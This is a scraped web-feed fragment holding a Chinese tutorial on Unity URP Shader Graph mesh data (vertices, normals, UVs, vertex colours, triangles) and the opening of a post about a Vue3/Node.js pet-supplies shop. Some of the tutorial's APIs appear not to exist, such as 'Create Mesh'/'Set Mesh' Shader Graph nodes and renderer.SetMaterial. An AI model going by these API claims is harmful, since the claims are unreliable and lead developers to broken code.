                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong></p>
</blockquote>
<h2 data-id="heading-0">Mesh网格定义与核心概念</h2>
<h3 data-id="heading-1">顶点（Vertex）的本质与特性</h3>
<p>顶点是构成3D模型的基本几何单元，每个顶点在三维空间中具有明确的坐标位置（x,y,z）。在Unity中，顶点不仅包含位置信息，还承载着模型渲染所需的多维数据：</p>
<ul>
<li><strong>法线（Normal）</strong>：垂直于表面的单位向量，决定光照计算的反射方向。平滑着色时，法线通过相邻面计算；硬边着色则直接使用面法线。</li>
<li><strong>UV坐标</strong>：二维纹理映射坐标，将2D纹理精准贴合到3D表面。UV值范围通常为0-1，超出部分通过纹理环绕模式处理。</li>
<li><strong>顶点颜色</strong>：支持RGBA通道的颜色数据，常用于实现渐变纹理或动态光照效果。</li>
</ul>
<h3 data-id="heading-2">程序化顶点生成</h3>
<p>通过Shader Graph的<code>Position</code>节点和数学运算，可动态生成顶点位置。例如，创建波浪效果：</p>
<p><code>// 伪代码示例：顶点位置偏移</code></p>
<p><code>float4 position = TransformPosition(float4(input.position.x,                      sin(input.position.x * 10) * 0.1,                      input.position.z, 1));</code></p>
<p>此代码通过正弦函数沿X轴生成周期性波动，实现水面扭曲效果。</p>
<h2 data-id="heading-3">面（Face）的构成与渲染优化</h2>
<h3 data-id="heading-4">三角形面片的优势</h3>
<p>三角形作为3D建模的最小单位，具有以下核心特性：</p>
<ul>
<li><strong>平面性</strong>：三个顶点必然共面，简化碰撞检测和光照计算。</li>
<li><strong>固定朝向</strong>：通过顶点顺序（顺时针/逆时针）定义正面/背面，支持背面剔除提升渲染效率。</li>
<li><strong>计算高效</strong>：三角形仅需3个顶点和3条边，比多边形更适合GPU并行处理。</li>
</ul>
<h3 data-id="heading-5">多边形的实现原理</h3>
<p>虽然多边形面片（如四边形）在建模中更直观，但渲染时会被分解为三角形。例如，Unity的网格渲染器会自动将四边形拆分为两个三角形，确保硬件兼容性。</p>
<h2 data-id="heading-6">URP Shader Graph中的网格数据处理</h2>
<h3 data-id="heading-7">顶点属性节点详解</h3>
<p>在Shader Graph中，通过以下节点访问顶点数据：</p>
<ul>
<li><strong>Position</strong>：获取模型空间或世界空间坐标。</li>
<li><strong>Normal</strong>：读取法线向量，用于光照计算。</li>
<li><strong>UV</strong>：访问纹理坐标，支持多通道UV（如UV1、UV2）。</li>
<li><strong>Color</strong>：读取顶点颜色，支持与纹理混合。</li>
</ul>
<h3 data-id="heading-8">示例：动态法线修改</h3>
<p>创建凹凸效果时，可通过修改法线改变光照表现：</p>
<p><code>// 伪代码示例：法线扰动</code></p>
<p><code>float3 normal = normalize(input.normal + float3(0,                      sin(input.position.x * 10) * 0.1,                      0));</code></p>
<p>此代码沿Y轴添加正弦波动，模拟表面起伏。</p>
<h2 data-id="heading-9">纹理映射与UV坐标实践</h2>
<h3 data-id="heading-10">UV坐标的工作原理</h3>
<p>UV坐标通过将3D表面展开为2D平面实现纹理映射。例如，立方体需6组UV坐标，而球体通常使用球形投影或立方体映射。</p>
<h3 data-id="heading-11">多通道UV应用</h3>
<p>复杂模型可能使用多组UV坐标：</p>
<ul>
<li><strong>UV1</strong>：主纹理通道。</li>
<li><strong>UV2</strong>：辅助纹理（如法线贴图）。</li>
<li><strong>UV3</strong>：顶点动画或动态遮罩。</li>
</ul>
<p>在Shader Graph中，通过<code>UV</code>节点选择通道，结合<code>Sample Texture 2D</code>实现多纹理混合。</p>
<h2 data-id="heading-12">顶点颜色与动态效果</h2>
<h3 data-id="heading-13">顶点颜色的应用场景</h3>
<ul>
<li><strong>渐变纹理</strong>：通过顶点颜色控制材质过渡。</li>
<li><strong>动态光照</strong>：结合顶点颜色实现局部光照变化。</li>
<li><strong>调试工具</strong>：可视化法线或UV坐标。</li>
</ul>
<h3 data-id="heading-14">示例：顶点颜色驱动透明度</h3>
<p>创建渐隐效果时，可通过顶点颜色控制透明度：</p>
<p><code>// 伪代码示例：颜色驱动透明度</code></p>
<p><code>float4 color = input.color * float4(1, 1, 1,                      smoothstep(0.5, 0.8, input.color.a));</code></p>
<p>此代码根据顶点Alpha值平滑调整透明度，实现边缘渐隐。</p>
<h2 data-id="heading-15">URP Shader Graph的优化技巧</h2>
<h3 data-id="heading-16">性能优化策略</h3>
<ul>
<li><strong>减少动态计算</strong>：将顶点属性计算移至顶点着色器。</li>
<li><strong>合并属性</strong>：通过<code>Attributes</code>节点打包数据，减少采样次数。</li>
<li><strong>使用LOD</strong>：根据距离简化网格复杂度。</li>
</ul>
<h3 data-id="heading-17">移动端适配</h3>
<ul>
<li><strong>简化着色器</strong>：避免复杂数学运算。</li>
<li><strong>压缩纹理</strong>：使用ASTC或ETC2格式。</li>
<li><strong>动态批处理</strong>：启用URP的自动批处理功能。</li>
</ul>
<h2 data-id="heading-18">进阶应用：程序化网格生成</h2>
<h3 data-id="heading-19">动态网格创建</h3>
<p>通过<code>Create Mesh</code>节点和<code>Set Mesh</code>节点，可在运行时生成网格：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 伪代码示例：生成平面网格</span>

Mesh mesh = <span class="hljs-keyword">new</span> Mesh(); 
mesh.vertices = <span class="hljs-keyword">new</span> Vector3[] {
          Vector3.zero,
          Vector3.right,
          Vector3.up,
          Vector3.right + Vector3.up
          };
mesh.triangles = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>[] { <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> };
</code></pre>
<p>此代码创建了一个包含两个三角形的平面。</p>
<h3 data-id="heading-20">实例化渲染</h3>
<p>使用<code>Instancing</code>节点和<code>Set Mesh</code>节点，可高效渲染大量相同网格：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 伪代码示例：实例化渲染` </span>

MaterialPropertyBlock props = <span class="hljs-keyword">new</span> MaterialPropertyBlock();
props.SetVector(<span class="hljs-string">"_Color"</span>, Color.red);
Renderer renderer = GetComponent&lt;Renderer&gt;();
renderer.SetPropertyBlock(props); 
renderer.SetMaterial(material, <span class="hljs-number">0</span>);
</code></pre>
<p>此代码为所有实例设置统一颜色，减少Draw Calls。</p>
<h2 data-id="heading-21">常见问题与解决方案</h2>
<h3 data-id="heading-22">法线错误</h3>
<ul>
<li><strong>现象</strong>：模型出现光照异常。</li>
<li><strong>解决</strong>：检查法线方向，使用<code>Normalize</code>节点修正。</li>
</ul>
<h3 data-id="heading-23">UV拉伸</h3>
<ul>
<li><strong>现象</strong>：纹理在模型表面扭曲。</li>
<li><strong>解决</strong>：优化UV展开，或使用<code>Tiling And Offset</code>节点调整。</li>
</ul>
<h3 data-id="heading-24">性能瓶颈</h3>
<ul>
<li><strong>现象</strong>：帧率下降。</li>
<li><strong>解决</strong>：简化着色器，减少动态计算，启用批处理。</li>
</ul>
<h2 data-id="heading-25">总结与最佳实践</h2>
<p>URP Shader Graph通过可视化节点系统，大幅降低了着色器开发门槛。掌握网格数据处理的核心要点：</p>
<ul>
<li><strong>顶点属性</strong>：灵活运用位置、法线、UV和颜色。</li>
<li><strong>三角形优势</strong>：利用其平面性和计算效率优化渲染。</li>
<li><strong>程序化生成</strong>：通过动态创建实现复杂效果。</li>
<li><strong>性能优化</strong>：减少计算，合并数据，适配移动端。</li>
</ul>
<p>结合URP的渲染管线特性和Shader Graph的节点化设计，开发者可快速实现从简单材质到复杂视觉效果的全方位创作。</p>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong>
（欢迎<em>点赞留言</em>探讨，更多人加入进来能更加完善这个探索的过程，🙏）</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈项目：宠物用品购物系统及后台管理]]></title>    <link>https://juejin.cn/post/7580285196692799488</link>    <guid>https://juejin.cn/post/7580285196692799488</guid>    <pubDate>2025-12-06T08:20:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580285196692799488" data-draft-id="7580288235030200320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈项目：宠物用品购物系统及后台管理"/> <meta itemprop="keywords" content="前端,后端,Vue.js"/> <meta itemprop="datePublished" content="2025-12-06T08:20:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="温暖全栈"/> <meta itemprop="url" content="https://juejin.cn/user/2850388198306766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈项目：宠物用品购物系统及后台管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2850388198306766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    温暖全栈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:20:52.000Z" title="Sat Dec 06 2025 08:20:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"♥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"⇲ ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid #c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">基于Vue3和Node.js的宠物用品购物系统设计与实现</h2>
<h3 data-id="heading-1">一、项目描述</h3>
<p>随着互联网技术的快速发展和宠物经济的持续升温，宠物用品电商平台已成为宠物主人购买宠物用品的主要渠道。设计并实现了一个基于Vue3和Node.js的全栈宠物用品购物系统，该系统采用前后端分离架构，包含用户购物系统和后台管理系统两个子系统。</p>
<p>系统前端采用Vue 3框架，结合TypeScript、Pinia状态管理、Vue Router路由管理和Element UI Plus组件库，实现了响应式的用户界面和流畅的交互体验。后端采用Node.js和Express框架，使用MongoDB作为数据库，通过JWT实现用户身份认证，构建了RESTful风格的API接口。系统实现了用户注册登录、商品浏览搜索、购物车管理、订单处理、社交互动、后台管理等核心功能。</p>
<h4 data-id="heading-2">1. 项目截图</h4>
